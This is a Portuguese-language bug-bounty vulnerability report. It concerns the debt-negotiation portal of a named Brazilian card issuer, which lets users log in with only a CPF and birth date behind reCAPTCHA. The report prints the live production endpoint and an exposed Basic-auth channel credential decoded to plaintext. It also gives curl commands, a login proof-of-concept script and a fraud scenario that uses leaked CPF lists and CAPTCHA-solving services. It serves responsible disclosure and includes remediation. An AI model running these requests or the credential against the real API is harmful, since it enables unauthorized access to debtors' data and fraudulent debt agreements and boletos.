# R6: Portal de Negociações — Autenticação com Apenas CPF + Data de Nascimento (CAPTCHA como Única Barreira)

**Programa:** BugPay Haven — Realize Soluções Financeiras (realizesolucoesfinanceiras.com.br)  
**Asset afetado:** `api.realizesolucoesfinanceiras.com.br`  
**Endpoint:** `POST /api/autenticacao/acesso/cpf/dataNascimento/cobranca`  
**Severidade:** HIGH  
**CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)  
**CWE:** CWE-521 — Weak Password Requirements · CWE-308 — Use of Single-factor Authentication  
**Descoberto:** 2026-06-29  
**Status:** Ready to submit

---

## Resumo

O portal de negociações de dívidas da Realize disponibiliza um fluxo de autenticação alternativo (`loginPortalNegociacao`) que permite acesso com **apenas CPF e data de nascimento** — sem necessidade de senha, PIN ou fator forte. O único mecanismo de proteção é o Google reCAPTCHA v2 (token passado no header `Captcha`).

CPF e data de nascimento são **semi-públicos** no contexto brasileiro: o CPF pode ser encontrado em diversas bases de dados vazadas (amplamente circuladas no Brasil), e a data de nascimento é comumente conhecida por familiares, colegas, ou inferível de perfis de redes sociais.

---

## Endpoint Confirmado (Ativo em Produção)

```
POST https://api.realizesolucoesfinanceiras.com.br/api/autenticacao/acesso/cpf/dataNascimento/cobranca
Authorization: Basic cmVubmVyLXByZS1hdXRlbnRpY2FjYW8tY29icmFuY2E6cHJlLWF1dGVudGljYWNhby1jb2JyYW5jYQ==
Content-Type: application/json
Captcha: <google-recaptcha-v2-token>

{"cpf": "12345678900", "dataNascimento": "1985-03-15"}
```

**Verificação de existência:**
```bash
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/autenticacao/acesso/cpf/dataNascimento/cobranca" \
  -H "Authorization: Basic cmVubmVyLXByZS1hdXRlbnRpY2FjYW8tY29icmFuY2E6cHJlLWF1dGVudGljYWNhby1jb2JyYW5jYQ==" \
  -H "Content-Type: application/json" \
  -H "Captcha: INVALID_CAPTCHA_TOKEN" \
  -d '{"cpf":"00000000191","dataNascimento":"1990-01-01"}'
```

**Resposta recebida (HTTP 400 — endpoint ativo, captcha rejeitado):**
```json
{"error":"invalid_request","error_description":null,"details":{"captcha":"true"}}
```

O endpoint retorna `400` com `details.captcha=true` quando o token CAPTCHA é inválido — confirmando que:
1. O endpoint existe e está ativo em produção
2. A única proteção além do CPF+data de nascimento é o reCAPTCHA
3. Não há verificação de senha ou PIN

---

## Descoberta das Credenciais e Fluxo

O endpoint e a credencial de canal (`renner-pre-autenticacao-cobranca:pre-autenticacao-cobranca`) foram encontrados no bundle JavaScript público:

```javascript
// Em /cartoes-renner/js/2.bundle-bb220f919f078e20c42e.js:

// Definição do método de autenticação
{
  key: "loginPortalNegociacao",
  value: function(t, e) {
    return call(this, "post", "acesso/cpf/dataNascimento/cobranca", t, e, H.basicPortalNegociacao)
  }
}

// Mapeamento de credencial
this.tokenTypeMap.push({
  key: H.basicPortalNegociacao,
  value: function() { return a.AUTHORIZATION_LOGIN_PORTAL_NEGOCIACAO }
})
// AUTHORIZATION_LOGIN_PORTAL_NEGOCIACAO =
// "Basic cmVubmVyLXByZS1hdXRlbnRpY2FjYW8tY29icmFuY2E6cHJlLWF1dGVudGljYWNhby1jb2JyYW5jYQ=="
// → "renner-pre-autenticacao-cobranca:pre-autenticacao-cobranca"

// Controller que aciona o login
{
  key: "loginPortalNegociacao",
  value: function(t, e, n) {
    var o = this;
    var a = { headers: { Captcha: n } };  // n = token do reCAPTCHA
    var i = this.$api.autenticacao.loginPortalNegociacao(
      { cpf: t, dataNascimento: e.format("YYYY-MM-DD") },
      a
    );
    return i.then(function(t) {
      t.token_context = H.access.toString();
      o.oauthToken.setToken(t);
      o.situacaoService.setSituacao(S.portalNegociacao)
    }), i
  }
}
```

---

## Prova de Conceito (para execução com CPF próprio)

```bash
#!/usr/bin/env bash
# PoC: Login no Portal de Negociações com CPF + Data de Nascimento
# EXECUTAR APENAS COM CPF PRÓPRIO OU DE TESTE

COBR_BASIC="cmVubmVyLXByZS1hdXRlbnRpY2FjYW8tY29icmFuY2E6cHJlLWF1dGVudGljYWNhby1jb2JyYW5jYQ=="

# Passo 1: Obter token reCAPTCHA (necessário; pode ser resolvido manualmente)
CAPTCHA_TOKEN="<TOKEN_RECAPTCHA_V2>"

# Passo 2: Autenticar com apenas CPF + data de nascimento
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/autenticacao/acesso/cpf/dataNascimento/cobranca" \
  -H "Authorization: Basic ${COBR_BASIC}" \
  -H "Content-Type: application/json" \
  -H "Captcha: ${CAPTCHA_TOKEN}" \
  -d '{"cpf":"SEU_CPF","dataNascimento":"SEU_ANIVERSARIO_YYYY-MM-DD"}'

# Resposta esperada (sucesso): Bearer token com scope de acesso ao portal de cobrança
# {
#   "access_token": "...",
#   "token_type": "bearer",
#   "scope": "site_pre_autenticacao_cobranca",
#   ...
# }

# Passo 3: Com o token, acessar dados de dívidas da conta
ACCESS_TOKEN="<TOKEN_DO_PASSO_2>"

curl -s "https://api.realizesolucoesfinanceiras.com.br/api/acordo/v2/divida" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}"

curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/acordo/v2/opcoes-pagamento" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"credor":"..."}'
```

---

## Acesso Disponível com o Token do Portal

Uma vez autenticado no portal de negociações, os seguintes endpoints ficam acessíveis (extraídos do bundle):

| Endpoint | Método | Impacto |
|----------|--------|---------|
| `GET /api/acordo/v2/divida` | GET | Listar todas as dívidas da conta |
| `GET /api/acordo/v2/divida/{id}` | GET | Detalhe de dívida específica |
| `POST /api/acordo/v2/opcoes-pagamento` | POST | Solicitar opções de pagamento |
| `POST /api/acordo/v2/negociacao` | POST | **Confirmar acordo de dívida** |
| `POST /api/acordo/v2/boleto` | POST | **Gerar boleto de acordo** |
| `GET /api/acordo/v2/acesso-rapido/status` | GET | Status de acesso rápido |
| `GET /api/autenticacao/user` | GET | Nome, CPF, conta, produto |
| `GET /api/acordo/v2/cliente` | GET | Dados do cliente devedor |
| `GET /api/acordo/v2/cliente/contatos` | GET | Email/telefone do cliente |

---

## Impacto ao Negócio

### Cenário de ataque (Alta plausibilidade)

Um agente malicioso obtém um CPF de um devedor Realize (ex.: de um arquivo de cobrança, cadastro em loja, sistema de parceria) e conhece ou consegue a data de nascimento (redes sociais, CPF+data em dados vazados). Com essas duas informações semi-públicas:

1. Resolve o reCAPTCHA manualmente (ou via serviço de solving: ~$0.001/captcha)
2. Autentica-se no portal de negociações da vítima
3. Obtém visão completa das dívidas (valores, credores, parcelas em atraso)
4. Pode confirmar acordos fraudulentos (dívida "negociada" com desconto para si mesmo)
5. Pode gerar boletos e desviar pagamentos

### Impacto direto

| Impacto | Severidade |
|---------|-----------|
| Exposição de dados financeiros pessoais (dívidas, acordos) | ALTO |
| Fraude em negociação de dívidas | CRÍTICO |
| Confirmação de acordos sem autorização do titular | CRÍTICO |
| Geração de boletos fraudulentos | ALTO |
| Violação da LGPD (acesso não autorizado a dados financeiros) | ALTO |

---

## Fatores Agravantes

1. **CPF + data de nascimento são semi-públicos no Brasil**: Listas de CPFs circulam amplamente em fóruns e grupos de mensageria (resultado de anos de vazamentos de órgãos públicos, e-commerce, etc.). A data de nascimento frequentemente acompanha esses dados ou é inferível.

2. **Captcha é a única barreira**: Serviços comerciais de resolução de CAPTCHA (2captcha, Anti-Captcha) cobram ~$1/1000 soluções, tornando ataques em escala economicamente viáveis.

3. **Fluxo sem bloqueio progressivo**: Diferente do login normal (que exige senha), este fluxo não incrementa tentativas fracassadas contra a conta — apenas o captcha limita.

4. **Base de exposição massiva**: A Realize atende milhões de portadores do Cartão Renner (Renner, Youcom, Camicado, Ashua). Todos que têm dívidas em atraso podem estar em risco.

---

## Remediação

### Imediato (P0)
1. **Adicionar fator forte**: Exigir um segundo fator de autenticação (código SMS/email registrado na conta) além de CPF + data de nascimento para acesso ao portal de negociações.
2. **Implementar account lockout progressivo**: Após 3-5 tentativas inválidas de CPF + data de nascimento, bloquear o CPF por período crescente (5 min, 30 min, 24h).

### Curto prazo (P1)
3. **Registrar e monitorar este endpoint**: Alertas para volume anômalo de acessos ao `/api/autenticacao/acesso/cpf/dataNascimento/cobranca` — spikes indicam ataque em andamento.
4. **Validar rigorosamente o captcha server-side**: Confirmar que o token é validado via API Google (`https://www.google.com/recaptcha/api/siteverify`) em cada requisição antes de processar.
5. **Implementar detecção de bot via fingerprint de IP/device**: Bloquear IPs que tentam múltiplos CPFs distintos em janela de tempo.

### Longo prazo (P2)
6. **Migrar para reCAPTCHA v3 + análise de risco**: reCAPTCHA v2 é resolvível automaticamente; v3 com análise de comportamento é mais resistente.
7. **Enviar notificação ao titular**: Toda autenticação via portal de negociações deve acionar notificação por SMS/email ao titular cadastrado.

---

## Referências

- CWE-521: Weak Password Requirements
- CWE-308: Use of Single-factor Authentication  
- OWASP Authentication Cheat Sheet: Multi-Factor Authentication
- LGPD Art. 46: Medidas de segurança para proteção de dados pessoais
- Endpoint ativo confirmado: `POST api.realizesolucoesfinanceiras.com.br/api/autenticacao/acesso/cpf/dataNascimento/cobranca`
- Credencial de canal exposta em JS público: `renner-pre-autenticacao-cobranca:pre-autenticacao-cobranca`
